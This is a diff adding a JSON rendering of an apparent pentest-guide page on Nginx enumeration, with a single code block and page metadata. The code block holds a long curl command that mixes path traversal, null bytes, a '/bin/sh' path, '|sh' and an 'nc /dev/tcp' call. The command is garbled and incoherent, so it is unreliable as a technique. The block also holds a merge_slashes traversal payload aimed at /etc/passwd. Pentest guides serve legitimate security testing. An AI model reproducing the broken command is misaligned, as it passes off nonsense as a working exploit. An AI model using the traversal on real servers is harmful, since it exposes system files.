@@ -1,0 +1,58 @@
+{
+    "title": "Nginx",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    ],
+    "sections": [
+        {
+            "type": "code_block",
+            "content": [
+                "curl -gsS https://example.com:443/../../../%00/nginx-handler?/usr/lib/nginx/modules/ngx_stream_module.so:127.0.0.1:80:/bin/sh%00example.com/../../../%00/n …\\<'protocol:TCP' -O 0x0238f06a#PLToffset |sh; nc /dev/tcp/localhost",
+                "",
+                "# If merge_slashes is OFF path traversal is possible, just append 1 slash more to find",
+                "///////../../../etc/passwd"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2020-09-28T09:19:43.014Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/nginx.md",
+        "previous_page": {
+            "title": "Flash SWF",
+            "url": "/enumeration/webservices/flash-swf"
+        },
+        "next_page": {
+            "title": "Python",
+            "url": "/enumeration/webservices/python"
+        }
+    }
+}
